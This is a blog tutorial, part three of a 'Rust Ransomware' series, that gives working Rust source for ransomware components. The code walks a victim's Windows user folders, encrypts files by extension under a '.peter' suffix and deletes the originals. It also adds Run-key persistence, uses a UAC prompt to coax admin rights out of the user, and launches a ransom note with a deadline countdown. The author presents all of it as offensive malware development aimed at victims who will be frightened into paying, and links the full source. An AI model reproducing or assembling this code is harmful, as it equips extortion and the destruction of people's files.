---
title: Rust Ransomware (Part 3)
categories:
- Malware Development
description: Rust Ransomware | Traversing Windows Directory and Priviledge Escalation
---

# Rust Ransomware: Part 3
## Traversing Windows Directory and Priviledge Escalation


### 1. Traverse and Encrypt


After having implemented the encrypting algorithm in [Part 2](https://cdong1012.github.io/malware%20development/2020/06/15/rust-ransomware2/), we need to traverse through the victim's computer's directories in order to find files to encrypt them.


Typically, directories and files are a bit complicated to process if you want to traverse through every single file, and this is because there is absolutely no way to tell how many directory layers on a victim's machine we need to go through in order to reach them all.


Therefore, it is much better to implement a recursive approach to this rather than using a lot of loops.


First, let's implement the recursive function called **traverse()**. It will take in a string containing the specified directory to traverse, encrypt any file it finds, and recursively go into directories that are contained in the directory.


Assume that we have a global vector of strings called **VALID_EXTENSION_VEC** storing all of the valid file extensions that we want to encrypt. I will go back later and explain how to create this. For now, let's assume it contains something like this.


``` rust
    VALID_EXTENSION_VEC = [
        ".pl", ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", ".d3dbsp", ".sc2save", ".sie",
        ".sum", ".bkp", ".flv", ".js", ".raw", ".jpeg", ".tar", ".zip", ".tar.gz", ".cmd",
        ".key", ".DOT", ".docm", ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
        ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx",
        ".html", ".xml", ".psd", ".bmp", ".pdf", ".py", ".rtf",
    ] // not actually rust code, this is just to show its content.
```


The first thing we need to do to traverse a directory is calling the WINAPI function [FindFirstFile](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findfirstfilea). This function will takes in our directory name and a pointer to a [WIN32_FIND_DATAA](https://docs.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-win32_find_dataa) struct, and it will populate the datas inside this struct with information about the first file/subdirectory it can find in our directory.


``` rust
    let mut file_data: WIN32_FIND_DATAA = WIN32_FIND_DATAA {
        dwFileAttributes: 0,
        ftCreationTime: FILETIME {
            dwLowDateTime: 0,
            dwHighDateTime: 0,
        },
        ftLastAccessTime: FILETIME {
            dwLowDateTime: 0,
            dwHighDateTime: 0,
        },
        ftLastWriteTime: FILETIME {
            dwLowDateTime: 0,
            dwHighDateTime: 0,
        },
        nFileSizeHigh: 0,
        nFileSizeLow: 0,
        dwReserved0: 0,
        dwReserved1: 0,
        cFileName: [0i8; 260],
        cAlternateFileName: [0i8; 14],
    };

    let mut hFind: HANDLE = INVALID_HANDLE_VALUE;
    hFind = FindFirstFileA(dir_name.as_ptr(), &mut file_data);
    if hFind == INVALID_HANDLE_VALUE {
        return; // if path not valid, return
    }
```


Note: When creating the ***WIN32_FIND_DATAA*** struct, typically, we can just call **WIN32_FIND_DATAA::default()** to populate all the fields with their default values according to their types. Sadly, the guy implementing the WinAPI for this Rust package did not implement the Default traits for any of the struct, and we have to do it by hand. Kinda sucky, but it is how it is...


**FindFirstFileA** will return a search handle, not a file handle. This handle can be used to call [FindNextFileA](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findnextfilea) to search for another file.


Next, we need to create an infinite while loop with the termination condition as **FindNextFileA** returns 0, or we have traverse through every single file and subdirectory in this directory.


``` rust
    loop {
        let mut name_buffer: Vec<u8> = Vec::new();

        for byte in file_data.cFileName.iter() {
            if byte.clone() == 0 {
                break;
            }
            name_buffer.push(byte.clone() as u8);
        }

        if file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY == 0 {
            // normal file
            let curr = dir_name.as_bytes();
            let mut new_dir = [&curr[..curr.len() - 1], &name_buffer[..]].concat();
            let dot_position = new_dir.as_mut_slice().iter().rposition(|x| *x == 46);
            let dot_position = dot_position.unwrap();
            let mut extension: Vec<u8> = Vec::new();
            for i in dot_position..new_dir.len() {
                extension.push(new_dir[i]);
            }

            if VALID_EXTENSION_VEC
                .iter()
                .any(|&x| CString::new(x).unwrap() == CString::new(&extension[..]).unwrap())
            {
                let mut source_file_name = new_dir.clone();
                let mut dest_file_name: Vec<u8> = Vec::new();
                for byte in source_file_name[..].iter() {
                    dest_file_name.push(byte.clone());
                }
                for byte in ".peter".as_bytes().iter() {
                    dest_file_name.push(byte.clone());
                }
                encrypt(
                    CString::new(&source_file_name[..]).unwrap(),
                    CString::new(&dest_file_name[..]).unwrap(),
                );
                DeleteFileA(CString::new(&source_file_name[..]).unwrap().as_ptr());
            }
        } else {
            // directory
            let name = str::from_utf8(&name_buffer).unwrap();
            if !((name_buffer.len() == 1 && name_buffer[0] == 46u8)
                || (name_buffer.len() == 2 && name_buffer[0] == 46u8 && name_buffer[1] == 46u8))
            {
                let curr = dir_name.as_bytes();
                let mut new_dir = [&curr[..curr.len() - 1], &name_buffer[..]].concat();
                new_dir = [&new_dir, "\\*".as_bytes()].concat();
                traverse(CString::new(new_dir).unwrap());
            }
        }

        if FindNextFileA(hFind, &mut file_data) == 0 {
            return;
        }
    }

```


Here, we first extract the name of this file/subdirectory into a Vector, and we check the field *dwFileAttributes* of our **WIN32_FIND_DATAA** struct to check whether it is a file or a subdirectory.


If it is a file, we extract the extension by locating the last occurence of the character **.** or 46 in Ascii. From there, we get the file extension, check if it is in **VALID_EXTENSION_VEC**.


If the file extension is valid, we encrypt the file using the encryption function we implemented earlier and write the output to a file with the same name but an extension of **".peter"**. Then, we delete the original copy and just leave the encrypted files.


If it is not a file, we first check if the directory's name is **"."** or **".."**. This is because **"."** stands for this current directory, and **".."** stands for the parent directory of this directory. If we recursively traverse through these 2, we will run into an infinite recursion and can not terminate, so we must ignore these.


If it is a normal directory, we add the directory name into our current path, and call **traverse** on it all over again.


At the end, we call **FindNextFileA** to look for the next file or subdirectory to process. If there is no other file in the directory, the function will return 0, and we can exit from the function.


So when are we populating the **VALID_EXTENSION_VEC**, and how to we get the original directory to traverse? We will need a parent function calling ***traverse*** as a helper function. Let's called this function ***traverse_and_encrypt***.

First, we will create **VALID_EXTENSION_VEC** as a static mutable Vector. This is because if we create it as an instance variable in  ***traverse***, the stack will grow significantly every time we enter another recursive calls. It is better to just have a global static Vector.


``` rust
    static mut VALID_EXTENSION_VEC: Vec<&str> = Vec::new();
```


Note: we can't call functions to populate this Vector because Rust simply does not let us do so. Therefore, we must populate it inside ***traverse_and_encrypt***.


``` rust
    let ext = [
        ".pl", ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", ".d3dbsp", ".sc2save", ".sie",
        ".sum", ".bkp", ".flv", ".js", ".raw", ".jpeg", ".tar", ".zip", ".tar.gz", ".cmd",
        ".key", ".DOT", ".docm", ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
        ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx",
        ".html", ".xml", ".psd", ".bmp", ".pdf", ".py", ".rtf",
    ];

    // push all valid extension into VALID_EXTENSION_VEC
    for each in ext.iter() {
        VALID_EXTENSION_VEC.push(each.clone());
    }
```

Next, we must determine which directory to traverse through. On each unique machine, this will be difference. Typically, we want to encrypt from the directory **C://Users//user_name//** where *user_name* is the user name of the current user of this computer.


In order to get this user name, we must call [GetUserNameA](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getusernamea).


``` rust
    let mut size: u32 = 0;
    let mut buffer: Vec<i8> = Vec::new();
    let mut user_name: Vec<u8> = Vec::new();

    // get length of name
    GetUserNameA(null_mut(), &mut size);
    buffer.resize(size as usize, 0i8);
    // get username
    GetUserNameA(buffer.as_mut_ptr(), &mut size);
    user_name = std::mem::transmute(buffer);
    user_name.resize((size - 1) as usize, 0u8); // eliminate the null terminator
```

First, we call **GetUserNameA** with NULL for the name because we only care about the name's length. This will be written into our mutable variable *size*. From there, we can allocate enough memory in the buffer for this before calling **GetUserNameA** again to write it into our buffer.


Inside this directory, there are a lot of directory that we don't necessarily want to go through like files and directories created by 3rd party softwares because they tend to use this directory a lot. We must specify the list of directory we want to go through.


``` rust
    let dir_names = [
        "Contacts",
        "Desktop",
        "Documents",
        "Downloads",
        "Favorites",
        "Music",
        "OneDrive\\Attachments",
        "OneDrive\\Desktop",
        "OneDrive\\Documents",
        "OneDrive\\Pictures",
        "OneDrive\\Music",
        "Pictures",
        "Videos",
    ];

    for dir in dir_names.iter() {
        let mut full_path = String::from("C:\\Users\\");
        full_path.push_str(str::from_utf8(&user_name[..]).unwrap());
        full_path.push_str("\\");
        full_path.push_str(dir.clone());
        full_path.push_str("\\*");
        // extract path and call traverse
        let full_path: CString = CString::new(full_path.as_bytes()).unwrap();
        traverse(full_path);
    }
```


For every directory name in the *dir_names* list, we add it into our directory path and call **traverse** on them, and that is about it.


To traverse through and delete instead of encrypt, we can just do the same thing without the encryption part and replace that with a call to [DeleteFileA](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-deletefilea).


### 2. Persistent


A good malware should always find a way to remain persistent on a victim's computer. To maintain persistent means to be able to keep running even after the victim tries to reboot or shutdown the machine. 


Different malwares have different reason for this. Trojans want to do this to maintain a backdoor, keylogger wants to continuously log keystrokes, or ransomware wants to keep displaying the ransomnote to make victim feel scared into paying the ransom.


For us, we will want to be able to do just that, running every time after rebooting and displaying the ransomnote.


There are a few problems we need to solve.

1. How are we going to make this executable run automatically after every reboot?
2. Since we are running the same code over and over again, how can the malware detect that the files have been encrypted so it does not waste time traversing through directories again?
3. How to keep track of the time when we first encrypt so we know when the deadline will be up and we can start deleting their files.


Well, this all depends on implementation, and there are so many ways to solve this. 


First, let's try and tackle problem 2 and 3. A simple solution to this is to just create a file somewhere on the system after encryption. Every time the malware is ran, it will check for the existence of this file. If this file exists, it does not traverse to encrypt anymore.


This can act as a kill-switch for the malware. Basically, if this condition is met, the malware is virtually harmless. I first install this feature when testing the malware on my machine in order not for it to encrypt any of my files.


Next, we can write the date and time what we finish encrypting into this file. This will let us keep track of the time when we encrypt the files, and when we can start deleting the files if they fail to pay up.


In **traverse_and_encrypt()**, we can do something like this


``` rust
    let mut full_path = String::from("C:\\Users\\");
    full_path.push_str(str::from_utf8(&user_name[..]).unwrap());
    full_path.push_str("\\encrypt_date.txt");

    let full_path: CString = CString::new(full_path).unwrap();

    let date_file: HANDLE = CreateFileA(
        full_path.as_ptr(),
        FILE_WRITE_DATA,
        FILE_SHARE_READ,
        null_mut(),
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        null_mut(),
    );

    let mut current_time: SYSTEMTIME = SYSTEMTIME {
        wYear: 0,
        wMonth: 0,
        wDayOfWeek: 0,
        wDay: 0,
        wHour: 0,
        wMinute: 0,
        wSecond: 0,
        wMilliseconds: 0,
    };
    GetSystemTime(&mut current_time);

    let mut write_buffer: Vec<u8> = Vec::new();
    if current_time.wMonth == 12 {
        current_time.wMonth = 1;
    } else {
        current_time.wMonth += 1;
    }
    write_buffer.push(current_time.wMonth as u8);
    write_buffer.push(current_time.wDay as u8);
    let mut written: u32 = 0;
    WriteFile(
        date_file,
        write_buffer.as_ptr() as *const _,
        2,
        &mut written,
        null_mut(),
    );
    CloseHandle(date_file);
```

After the encryption, we create a file in the user directory called **encrypt_date.txt**, and write the system time into it. Boom, we just solve 2 of our problems.


Next, we can create a function called **already_encrypt()** that will return true if this file exists!


``` rust
   fn already_encrypt() -> bool {
       let mut size: u32 = 0;
       let mut buffer: Vec<i8> = Vec::new();
       let mut _user_name: Vec<u8> = Vec::new();
       unsafe {
           GetUserNameA(null_mut(), &mut size);
           buffer.resize(size as usize, 0i8);

           GetUserNameA(buffer.as_mut_ptr(), &mut size);
           _user_name = std::mem::transmute(buffer);
           _user_name.resize((size - 1) as usize, 0u8);

           let mut full_path = String::from("C:\\Users\\");
           full_path.push_str(str::from_utf8(&_user_name[..]).unwrap());
           full_path.push_str("\\encrypt_date.txt");

           let full_path: CString = CString::new(full_path).unwrap();

           if CreateFileA(
               full_path.as_ptr(),
               1,
               1,
               null_mut(),
               OPEN_EXISTING,
               0x80,
               null_mut(),
           ) == INVALID_HANDLE_VALUE
           {
               return false;
           }
       }
       true
   }
```

Note: We are calling [CreateFileA](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) with a flag of **OPEN_EXISTING**. This will fail if the file does not exist and can't be open. This is a simple hack combining with what we did after the encryption phase in order to check if we already encrypt the file system.


In order to make our executable run every time after reboot, we just need to write our executable file name to the registry **"Software\\Microsoft\\Windows\\CurrentVersion\\Run"**. Every executable in this registry will be set up to automatically run after shutdown or reboot.

``` rust
   fn add_registry() -> bool {
       unsafe {
           let mut registry_handle: HKEY = null_mut();
           if RegOpenKeyExA(
               HKEY_LOCAL_MACHINE,
               CString::new("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
                   .unwrap()
                   .as_ptr(),
               0,
               KEY_ALL_ACCESS,
               &mut registry_handle,
           ) != 0
           {
               println!("Fail to open registry key");
               RegCloseKey(registry_handle);
               return false;
           }

           let mut reg_type: u32 = 0;
           let mut path: Vec<u8> = Vec::new();
           let mut size: u32 = 200;
           path.resize(200, 0u8);

           if RegGetValueA(
               HKEY_LOCAL_MACHINE,
               CString::new("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
                   .unwrap()
                   .as_ptr(),
               CString::new("Peter'sRansomware").unwrap().as_ptr(),
               2,
               &mut reg_type,
               path.as_ptr() as *const _ as *mut _,
               &mut size,
           ) != 0
           {
               let mut name: Vec<i8> = Vec::new();
               name.resize(200, 0i8);
               let mut length = GetModuleFileNameA(null_mut(), name.as_ptr() as *mut i8, 200);
               let mut path: Vec<u8> = Vec::new();
               for i in 0..length as usize {
                   path.push(name[i].clone() as u8);
               }
               path.push(0u8);
               length += 1;

               if RegSetValueExA(
                   registry_handle,
                   CString::new("Peter'sRansomware").unwrap().as_ptr(),
                   0,
                   REG_SZ,
                   path.as_ptr(),
                   length,
               ) != 0
               {
                   println!("Fail to set registry key");
                   RegCloseKey(registry_handle);
                   return false;
               } else {
                   RegCloseKey(registry_handle);
                   return true;
               }
           } else {
               println!("Key already there, dont do anything");
               RegCloseKey(registry_handle);
               return false;
           }
       }
   }
```


Basically, we first open the key to the registry through [RegOpenKeyExA](https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexa), and write our executable file name to that registry through [RegGetValueA](https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-reggetvaluea). 


After this function suceeds, our executable will be ran automatically every single time even when the victim tries to reboot their computer.


## 3. Priviledge Escalation


Typically, we would want our malware to have admin priviledge, and there are a few ways a malicious software can achieve this.


One of the popular ways to do this is through a 0-day vulnerability. Basically, if the attacker can find some vulnerability on some part of the Windows system, they can write an exploit for the malware to execute to get higher priviledge. This is as cool as it sounds, but it is a bit hard to do.


Since this tutorial is not about bug-hunting, we will not dive into finding a 0-day vulnerability on Windows machine. Instead, we will use social engineering.


The concept of social engineering is simple. Since humans are always the weakest link in any system, we can simply exploit them by directly ask for permissions.


Ever notice how when a third-party software needs to make some major change in your computer, they always have a pop-up like this asking for permission?


![alt text](https://www.howtogeek.com/wp-content/uploads/2012/09/image178.png "UAC")


This is what is known as [UAC](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works). Every app that requires admin access token needs to prompt this pop-up to ask the user for consent.


This is a great way to enforce priviledge security, but a typical user would not be inclined to click YES on this if they do not understand what the application is about.


Most of the time, users will think some software internally will fail if they don't agree to click YES on this, so they just develop a habit to click YES over time. After all, most softwares that prompt for this is legit, and they almost never have any bad consequence for clicking YES.


We will learn how to prompt this and directly ask the victim for admin priviledge to the machine.


First, we will check if we already have admin acess token or not. Major shoutout to this [blog](https://vimalshekar.github.io/codesamples/Checking-If-Admin) for giving me the code in C++ to translate into Rust.


``` rust
   fn is_elevated() -> bool {
       let mut h_token: HANDLE = null_mut();
       let mut token_ele: TOKEN_ELEVATION = TOKEN_ELEVATION { TokenIsElevated: 0 };
       let mut size: u32 = 0u32;
       unsafe {
           OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut h_token);
           GetTokenInformation(
               h_token,
               TokenElevation,
               &mut token_ele as *const _ as *mut _,
               std::mem::size_of::<TOKEN_ELEVATION>() as u32,
               &mut size,
           );
           return token_ele.TokenIsElevated == 1;
       }
   }
```

This function will return **false** if we does not have admin access. Next, we can have a function checking for this, and if we don't have admin priviledge, we will prompt UAC.

``` rust
   fn check_elevation() -> bool {
       unsafe {
           let mut name: Vec<i8> = Vec::new();
           name.resize(200, 0i8);
           let length = GetModuleFileNameA(null_mut(), name.as_ptr() as *mut i8, 200);
           let mut path: Vec<u8> = Vec::new();
           for i in 0..length as usize {
               path.push(name[i].clone() as u8);
           }
           if is_elevated() {
               return true;
           } else {
               println!("This is not elevated yet");
               ShellExecuteA(
                   null_mut(),
                   CString::new("runas").unwrap().as_ptr(),
                   CString::from_vec_unchecked(path).as_ptr(),
                   null_mut(),
                   null_mut(),
                   1,
               );
           }
           return false;
       }
   }
```


The main trick here lies in [ShellExecuteA](https://docs.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecutea). If we specify the field *lpOperation* as **"runas**, it will *"launches the application as Administrator. User Account Control (UAC) will prompt the user for consent to run the application elevated or enter the credentials of an administrator account used to run the application"* according to MSDN. Therefore, we can pass our executable file path into this function and have UAC prompt for priviledge for us.


## 4. Ransomnote


I got really lazy when I got to dispoint to write a fully functioning ransomnote, so I asked my friend Thu from UCI to write a simple Python tkinter GUI for me!


Here is what it looks like.
    ![alt text](/uploads/malware.JPG)


Basically, the goal is to show this with a countdown from the time written in **encrypt_date.txt** after the encryption and have it ran every time the machine reboots. We can simply just create a process for this with [CreateProcessA](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa).


``` rust
   fn display_ransom_note() -> bool {
       let mut size: u32 = 0;
       let mut buffer: Vec<i8> = Vec::new();
       let mut _user_name: Vec<u8> = Vec::new();
       unsafe {
           GetUserNameA(null_mut(), &mut size);
           buffer.resize(size as usize, 0i8);

           GetUserNameA(buffer.as_mut_ptr(), &mut size);
           _user_name = std::mem::transmute(buffer);
           _user_name.resize((size - 1) as usize, 0u8);

           let mut full_path = String::from("C:\\Users\\");
           full_path.push_str(str::from_utf8(&_user_name[..]).unwrap());
           full_path.push_str("\\encrypt_date.txt");

           let date_file: HANDLE = CreateFileA(
               CString::new(full_path.clone()).unwrap().as_ptr(),
               FILE_READ_DATA,
               FILE_SHARE_READ,
               null_mut(),
               OPEN_EXISTING,
               FILE_ATTRIBUTE_NORMAL,
               null_mut(),
           );

           let mut get_date: Vec<u8> = Vec::new();
           get_date.resize(2, 0u8);
           let mut count: u32 = 0;
           ReadFile(
               date_file,
               get_date.as_ptr() as *mut _,
               2,
               &mut count,
               null_mut(),
           );

           if get_date[0] == 99 && get_date[1] == 99 {
               return false;
           }

           CloseHandle(date_file);
           let mut name: Vec<i8> = Vec::new();
           name.resize(200, 0i8);
           let length = GetModuleFileNameA(null_mut(), name.as_ptr() as *mut i8, 200);
           let mut path: Vec<u8> = Vec::new();
           for i in 0..(length - 19) as usize {
               path.push(name[i].clone() as u8);
           }

           for byte in "ransomnote.exe".as_bytes() {
               path.push(byte.clone());
           }
           let mut start_up_info: STARTUPINFOA = STARTUPINFOA {
               cb: std::mem::size_of::<STARTUPINFOA>() as u32,
               lpReserved: null_mut(),
               lpDesktop: null_mut(),
               lpTitle: null_mut(),
               dwX: 100,
               dwY: 100,
               dwXSize: 500,
               dwYSize: 500,
               dwXCountChars: 0,
               dwYCountChars: 0,
               dwFillAttribute: 0,
               dwFlags: 4 | STARTF_USESHOWWINDOW,
               wShowWindow: 0,
               cbReserved2: 0,
               lpReserved2: null_mut(),
               hStdInput: null_mut(),
               hStdOutput: null_mut(),
               hStdError: null_mut(),
           };
           let process_handle: HANDLE = null_mut();
           let thread_handle: HANDLE = null_mut();
           let mut process_info: PROCESS_INFORMATION = PROCESS_INFORMATION {
               hProcess: process_handle,
               hThread: thread_handle,
               dwProcessId: 4000,
               dwThreadId: 5000,
           };
           let mut command_line: Vec<u8> = Vec::new();
           for byte in path.clone() {
               command_line.push(byte);
           }
           command_line.push(32u8);
           for byte in full_path.as_bytes() {
               command_line.push(byte.clone());
           }
           command_line.push(0u8);
           CreateProcessA(
               CString::from_vec_unchecked(path).as_ptr(),
               CString::from_vec_unchecked(command_line).as_ptr() as *mut i8,
               null_mut(),
               null_mut(),
               0,
               0x10, //CREATE_NEW_CONSOLE
               null_mut(),
               null_mut(),
               &mut start_up_info,
               &mut process_info,
           );
           return true;
       }
   }
```


Since our python GUI program takes the file **encrypt_date.txt** path as a command line parameter, we first need to get the path of that file before calling **CreateProcessA**. 


Note: the *lpCommandLine* field from **CreateProcessA** takes the current executable GUI file as the first parameter and the **encrypt_date.txt** file path as the second parameter. It took me so long to figure this out because originally, I only have the **encrypt_date.txt** file path as the only parameter, and it constantly fails.


## 5. Wrapping up


From here, we have implemented the basic techniques and different components of a ransomware.


Even though Rust is not as fast as C++, I still think it is an awesome language to develop in, and I will certainly use more of Rust for malware development!


Hopefully, you have learned a thing or two throughout this Rust Ransomware series of mine.


If you are interested in the source code of this entire malware, feel free to check it out here at my [github](https://github.com/cdong1012/Rust-Ransomware).
